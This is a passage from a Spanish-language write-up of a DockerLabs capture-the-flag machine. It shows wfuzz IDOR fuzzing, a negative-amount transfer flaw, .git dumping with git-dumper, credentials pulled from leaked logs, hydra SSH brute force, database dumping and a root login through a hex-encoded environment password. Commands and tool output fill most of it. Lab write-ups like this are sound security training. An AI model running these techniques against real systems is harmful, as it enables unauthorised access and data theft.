[80][http-post-form] host: realgob.dl   login: adan   password: qwerty
```

### /contacto.php (XSS)

El recurso **contacto.php** permite rellenar un formulario, pero no verifica el input del usuario:

![Desktop View](/20251120004054.webp){: width="972" height="589" .shadow}

Por ello, concluimos que los dos campos (nombre y mensaje) son vulnerables a inyecciones **XSS** (Cross-Site Scripting):

![Desktop View](/20251120004044.webp){: width="972" height="589" .shadow}

### /important.txt

En **important.txt** encontramos un mensaje que ha dejado el creador del laboratorio donde hace algunas aclaraciones con respecto a como enfocar la resolución del mismo:

![Desktop View](/20251120015843.webp){: width="972" height="589" .shadow}

### /registro.php (Users Enumeration by Brute Force)

Al igual que pasaba con el formulario de autenticación **login.php**, podemos emplear el formulario de **registro.php** para obtener por fuerza bruta los usuarios ya registrados del sistema:

![Desktop View](/20251119221608.webp){: width="972" height="589" .shadow}

### /transferencia.php (Business Logic Integer Underflow)

Tras probar la funcionalidad de **transferencia.php**, nos daremos cuenta de que hay varias vulnerabilidades a la hora de realizar una transferencia.

Tenemos, por un lado nuestra cuenta, que es la que creamos anteriormente, la cual tiene una cierta cantidad de dinero:

![Desktop View](/20251120192322.webp){: width="972" height="589" .shadow}

Y por otro lado tenemos la siguiente cuenta, que tiene la siguiente cantidad de dinero, diferente a la nuestra:

![Desktop View](/20251120192345.webp){: width="972" height="589" .shadow}

Tratamos de realizar una transferencia desde nuestra cuenta a la otra cuenta, pero empleando un número negativo:

![Desktop View](/20251120192430.webp){: width="972" height="589" .shadow}

Si volvemos a mirar el balance de nuestra cuenta, veremos que ha aumentado la cantidad que indicamos en la transferencia:

![Desktop View](/20251120183936.webp){: width="972" height="589" .shadow}

Y en la otra cuenta veremos que ahora el valor es negativo:

![Desktop View](/20251120183916.webp){: width="972" height="589" .shadow}

Esto significa que la aplicación tiene dos vulnerabilidades en las transferencias:
- Permite indicar valores negativo, lo que implica la sustracción de saldo de una cuenta a otra.
- No valida el saldo del usuario al que se le está haciendo la transferencia, lo que permite, junto con la anterior vulnerabilidad, aumentar sin límite el saldo de una cuenta.

### /edo_cuenta.php (IDOR)

El recurso **edo_cuenta.php** es el que nos lista la información de la cuenta, el cual vemos que acepta el parámetro `id`.

Para poder probar si el recurso es vulnerable a un **IDOR** (Insecure Direct Object Reference), revisamos con **wfuzz** todos los IDs que nos devuelven un código de estado exitoso:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ wfuzz -c --hc=404 -t 200 -z range,1-10000 -u "http://realgob.dl/edo_cuenta.php?id=FUZZ" -L -H "Cookie: PHPSESSID=55vvu3dn4qpinp9k2adorigtkv" -p 127.0.0.1:8080
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz`s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://realgob.dl/edo_cuenta.php?id=FUZZ
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                            
=====================================================================

000000001:   200        67 L     180 W      2776 Ch     "1"                                                                                                                
000000066:   200        67 L     175 W      2754 Ch     "66"                                                                                                               
000000006:   200        67 L     178 W      2773 Ch     "6"                                                                                                                
000000008:   200        67 L     180 W      2781 Ch     "8"                                                                                                                
000000007:   200        67 L     180 W      2786 Ch     "7"                                                                                                                
000000009:   200        67 L     179 W      2768 Ch     "9"                                                                                                                
000000005:   200        67 L     179 W      2774 Ch     "5"                                                                                                                
000000004:   200        67 L     181 W      2776 Ch     "4"                                                                                                                
000000068:   200        67 L     175 W      2720 Ch     "68"                                                                                                               

Total time: 69.22203
Processed Requests: 10000
Filtered Requests: 9991
Requests/sec.: 144.4626
```

Con los valores que hemos obtenido, podemos ver la información de cada cuenta, cambiando en la URL el valor del parámetro `id`:

![Desktop View](/20251119202801.webp){: width="972" height="589" .shadow}

### /desarrollo (Information Disclosure)

En el recurso **desarrollo** podemos ver un panel de administración que no está protegido por ningún panel de autenticación:

![Desktop View](/20251119000525.webp){: width="972" height="589" .shadow}

Al ir a revisar que otros recursos cuelgan de este, vemos que hay varios relacionados con `git`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ gobuster dir -u "http://realgob.dl/desarrollo/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200                                       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://realgob.dl/desarrollo/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 318] [--> http://realgob.dl/desarrollo/.git/]
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.git/HEAD            (Status: 200) [Size: 23]
/.git/config          (Status: 200) [Size: 92]
/.git/index           (Status: 200) [Size: 898]
/.git/logs/           (Status: 200) [Size: 1162]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 6099]
Progress: 4746 / 4746 (100.00%)
===============================================================
Finished
===============================================================
```

En casos como este en el que una carpeta `.git` se pueda listar, una herramienta que nos permite obtener todos los ficheros automáticamente es **git-dumper** ([GitHub](https://github.com/arthaud/git-dumper)), la cual se necesita configurar inicialmente de la siguiente manera:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ git clone https://github.com/arthaud/git-dumper
Cloning into 'git-dumper'...
remote: Enumerating objects: 204, done.
remote: Counting objects: 100% (104/104), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 204 (delta 69), reused 60 (delta 57), pack-reused 100 (from 2)
Receiving objects: 100% (204/204), 67.13 KiB | 838.00 KiB/s, done.
Resolving deltas: 100% (106/106), done.

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ cd git-dumper

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report/git-dumper]
└─$ python3 -m venv venv

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report/git-dumper]
└─$ source venv/bin/activate

┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report/git-dumper]
└─$ pip3 install -r requirements.txt
```

Una vez configurada, procedemos a ejecutarla, indicando la ubicación de la carpeta `.git` que queremos obtener, y la carpeta donde queremos guardar todo el contenido que va a descargar:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report/git-dumper]
└─$ python3 git_dumper.py http://realgob.dl/desarrollo/.git/ dump     
[-] Testing http://realgob.dl/desarrollo/.git/HEAD [200]
[-] Testing http://realgob.dl/desarrollo/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://realgob.dl/desarrollo/.gitignore [404]
...
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 10 paths from the index
```

Teniendo ya todo el contenido de la carpeta `.git`, procedemos a revisar lo que hemos obtenido:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report/git-dumper]
└─$ cd dump
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ ls -la                                                  
total 52
drwxrwxr-x 3 elcybercurioso elcybercurioso 4096 XXX XX XX:XX .
drwxrwxr-x 5 elcybercurioso elcybercurioso 4096 XXX XX XX:XX ..
-rw-rw-r-- 1 elcybercurioso elcybercurioso   23 XXX XX XX:XX acca
-rw-rw-r-- 1 elcybercurioso elcybercurioso   86 XXX XX XX:XX access_log.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso  113 XXX XX XX:XX changes_log.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso   79 XXX XX XX:XX config.php
drwxrwxr-x 7 elcybercurioso elcybercurioso 4096 XXX XX XX:XX .git
-rw-rw-r-- 1 elcybercurioso elcybercurioso  205 XXX XX XX:XX login_changes_log.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso  175 XXX XX XX:XX noticias_log.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso   84 XXX XX XX:XX password.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso  168 XXX XX XX:XX php_version_update_log.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso  131 XXX XX XX:XX remote_management_log.txt
-rw-rw-r-- 1 elcybercurioso elcybercurioso  140 XXX XX XX:XX suspicious_activity.txt
```

#### acca

Este fichero no contiene nada relevante:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat acca
hola mundo subdominado
```

#### access_log.txt

Aquí se está filtrando cierta información, pero nada que nos permita avanzar:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat access_log.txt
Intento de acceso no autorizado desde IP 192.168.1.10 el Mon Oct 14 07:39:27 GMT 2024
```

#### changes_log.txt

En este caso también se filtra algo de información, pero nada relevante:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat changes_log.txt 
Cambio en la configuración: Se actualizó el timeout de la sesión a 30 minutos el Mon Oct 14 07:39:33 GMT 2024
```

#### config.php

Al tratarse de un fichero de configuración, siempre es importante revisarlo, ya que podrían contener contraseñas en texto claro, como en este caso:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat config.php
<?php
echo password_hash('c***************************', PASSWORD_DEFAULT);
?>
```

#### login_changes_log.txt

Aquí nos indican que el usuario `developer` ha hecho modificaciones en el panel de login. Podemos pensar que igual existe una cuenta con el usuario `developer`:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat login_changes_log.txt
Se han realizado cambios en el diseño del panel de login. Se han corregido fallos de seguridad y se ha mejorado la interfaz de usuario. Cambios realizados por 'developer' el Mon Oct 14 07:47:07 GMT 2024.
```

#### noticias_log.txt

Nos indican aquí que el usuario `editor` también podría ser un usuario existente:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat noticias_log.txt
Actualización de contenido en el panel de noticias. Se han agregado nuevos artículos y se han eliminado los antiguos. Accedido por 'editor' el Mon Oct 14 07:46:33 GMT 2024.
```

#### password.txt

Nos indican que la siguiente podría tratarse de una contraseña, por lo que la guardamos para más tarde hacer pruebas de acceso:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat password.txt
- d******** -
No olvidar borrar logs y actualizar la contrasnea para el año actual
```

#### php_version_update_log.txt

Nos indican que el usuario `sysadmin` podría ser un usuario válido en el sistema:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat php_version_update_log.txt
Se ha actualizado la versión de PHP a 8.1. Se realizaron pruebas de compatibilidad y se corrigieron errores. Realizado por 'sysadmin' el Mon Oct 14 07:46:47 GMT 2024.
```

#### remote_management_log.txt

Aquí directamente nos facilitan unas credenciales que podemos usar para acceder de forma remota, posiblemente para acceder por SSH:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat remote_management_log.txt
Acceso a Remote Management realizado por 'adm' el Mon Oct 14 07:44:17 GMT 2024. Nueva contraseña: 9fR8***************************
```
#### suspicious_activity.txt

En este fichero nos indican otro posible usuario del sistema:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/DockerLabs/Report/git-dumper/dump]
└─$ cat suspicious_activity.txt           
Actividad sospechosa detectada: Usuario 'dev_admin' intentó acceder al área de administración sin éxito el Mon Oct 14 07:39:40 GMT 2024
```


Con todos las credenciales obtenidas, tratamos de acceder para ver si logramos acceder a la máquina por **SSH**:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ hydra -L users.txt -P passwords.txt ssh://172.17.0.2 -t 64 -I 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:5/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: adm   password: 9fR8***************************
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

Finalmente, obtenemos acceso a la máquina como el usuario `adm`:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ ssh adm@172.17.0.2                                                   
adm@172.17.0.2`s password: 
adm@d64220750c6a:~$ whoami
adm
adm@d64220750c6a:~$ hostname -I
172.17.0.2
```

## escalada de privilegios (root)

Procedemos a listar los usuario del sistema, y que tengan asignada una consola en el fichero `/etc/passwd`:

```bash
adm@d64220750c6a:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
adm:x:1001:100::/home/adm:/bin/bash
```

Analizando la máquina, encontramos que tenemos permisos para leer el script `/var/www/html/config.php`, el cual contiene las credenciales de acceso (en texto claro) al gestor de bases de datos:

```bash
adm@d64220750c6a:/tmp$ cat /var/www/html/config.php
<?php
$servername = "localhost";
$username = "root"; // 
$password = "l*************************"; 
$dbname = "GOB_BD";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Comprobar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}
?>
```

Tratamos de conectarnos con dichas credenciales, y vemos que efectivamente son correctas:

```bash
adm@d64220750c6a:/tmp$ mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 242830
Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databasesl
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'databasesl' at line 1
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| GOB_BD             |
| information_schema |
| mysql              |
| noticias           |
| performance_schema |
| sys                |
+--------------------+
6 rows in set (0.004 sec)

MariaDB [(none)]> use GOB_BD
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [GOB_BD]> show tables;
+------------------+
| Tables_in_GOB_BD |
+------------------+
| transacciones    |
| users            |
+------------------+
2 rows in set (0.001 sec)

MariaDB [GOB_BD]> select * from transacciones;
+----+---------+---------+----------------+------------------+---------------------+---------------+
| id | user_id | monto   | cuenta_destino | descripcion      | fecha               | cuenta_origen |
+----+---------+---------+----------------+------------------+---------------------+---------------+
|  1 |      66 |   23.00 | 99999999       | pago predial     | 2024-10-14 03:37:30 |               |
|  2 |       7 |   23.00 | 99999999       | Pago Multa       | 2024-10-14 04:26:58 | 46126168      |
|  3 |       7 |  120.00 | 99999999       | Deuda Escrituras | 2024-10-14 04:29:29 | 46126168      |
|  4 |       1 |   44.00 | 99999999       | rukaleta         | 2024-10-14 04:47:10 | 89542776      |
|  5 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 04:59:49 | 89542776      |
|  6 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 05:00:29 | 89542776      |
|  7 |       1 |   50.00 | 99999999       | nomas            | 2024-10-14 05:02:11 | 89542776      |
|  8 |       1 |  123.00 | 99999999       | extra            | 2024-10-14 05:03:21 | 89542776      |
|  9 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 05:04:41 | 89542776      |
| 10 |       1 |  407.00 | 89542776       | concepto 2321    | 2024-10-14 05:04:46 | 89542776      |
| 11 |       1 |  407.00 | 89542776       | concepto 2321    | 2024-10-14 05:08:26 | 89542776      |
| 12 |       7 |    2.00 | 99999999       | rea              | 2024-10-14 05:12:41 | 46126168      |
| 13 |       8 |  123.00 | 34343017       | real             | 2024-10-14 05:15:24 | 34343017      |
| 14 |       8 |   23.00 | 34343017       | tarjeta nueva    | 2024-10-14 05:17:44 | 34343017      |
| 15 |       8 |  123.00 | 34343017       | cheves           | 2024-10-14 05:18:08 | 34343017      |
| 16 |       8 |   12.00 | 99999999       | magic            | 2024-10-14 05:27:02 | 34343017      |
| 17 |       8 |  120.00 | 99999999       | concepto chidito | 2024-10-14 05:28:04 | 34343017      |
| 18 |       8 |  123.00 | 99999999       | descri           | 2024-10-14 05:29:55 | 34343017      |
| 19 |       8 |  120.00 | 99999999       | redis            | 2024-10-14 05:31:42 | 34343017      |
| 20 |      68 |    1.00 | 63600558       | test             | XXXX-XX-XX XX:XX:XX | 63600558      |
| 21 |      68 |    1.00 | 63600558       | test             | XXXX-XX-XX XX:XX:XX | 63600558      |
| 22 |      68 |    1.00 | 89542776       | test             | XXXX-XX-XX XX:XX:XX | 63600558      |
+----+---------+---------+----------------+------------------+---------------------+---------------+
22 rows in set (0.001 sec)

MariaDB [GOB_BD]> select * from users;
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
| id | username | password                                                     | nombre        | apellido | email                        | dni       | direccion                                | telefono     | saldo       | no_cuenta |
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
|  1 | adan     | $2y$10$IBfP************************************************* | Adan          | Martnez  | adan@gmail.com               | 12345678A | Calle de Ejemplo 123, Ciudad Ejemplo     | +34123456789 |       57.00 | 89542776  |
|  4 | yahir    | $2y$10$6d2L************************************************* | yahir         | lopez    | yahir23@gmail.com            | 23123     | La direccion mas prra #24 Colonia Grillo | 2325124523   |        0.00 | 96271035  |
|  5 | joaquin  | $2y$10$slvT************************************************* | joaquin       | guzman   | chapito@hotmail.com          | V2F9SK4   | Av Lautaro Calle Celeste #24             | 938572245    |      150.00 | 12726850  |
|  6 | Felipe   | $2y$10$fJhC************************************************* | Felipe        | Calderas | calder98@gmail.com           | GS8GVS    | Colonia Centro Matamoros #232            | 728592354    |      150.00 | 74821147  |
|  7 | Eduardo  | $2y$10$Pv0A************************************************* | Eduardo       | Felix    | lalomora@hotmail.com         | FG9S72K8  | Colonia Hernandez Monroy Av Eulalio #153 | 9784712841   |        7.00 | 46126168  |
|  8 | Andrea   | $2y$10$Hvr0************************************************* | Andrea        | Casas    | andycc2@gmail.com            | F9S8GKA8  | Calle Av Universal Tamaulipas Centro #85 | 8237850302   |        7.00 | 34343017  |
|  9 | vaxei    | $2y$10$IPff************************************************* | Vaxei         | Lopez    | usvaxei@gmail.com            | 938F8kG8  | Circuito del carmen #592 Bol             | 893858224    |      150.00 | 69878704  |
| 66 | admin    | $2y$10$hX7a************************************************* | Administrador |          | edo_administracion@gmail.com |           |                                          |              | 14030327.00 | 99999999  |
| 68 | test     | $2y$10$SV3g************************************************* | test          | test     | test@test.com                | x         | x                                        | x            |      147.00 | 63600558  |
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
9 rows in set (0.001 sec)
```

Revisamos también las variables de entorno, donde encontramos `MY_PASS`, que podemos concluir que se trata de una contraseña, pero no sabemos si todavía sigue siendo válida:

```bash
adm@d64220750c6a:/tmp$ env
...
MY_PASS=64 6f XX XX XX XX XX XX XX XX XX XX
...
```

El formato que tiene podría ser hexadecimal, por lo que procedemos a tratar de transformarlo a cadena de texto:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ echo "64 6f XX XX XX XX XX XX XX XX XX XX" | xxd -r -p                                          
d***********
```

Probamos a loguearnos como el usuario `root` con la cadena obtenida, y vemos que la contraseña es correcta:

```bash
adm@d64220750c6a:~$ su root
Password: 
root@d64220750c6a:/home/adm# whoami
root
```

Y de esta manera, habremos obtenido acceso privilegiado a la máquina!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>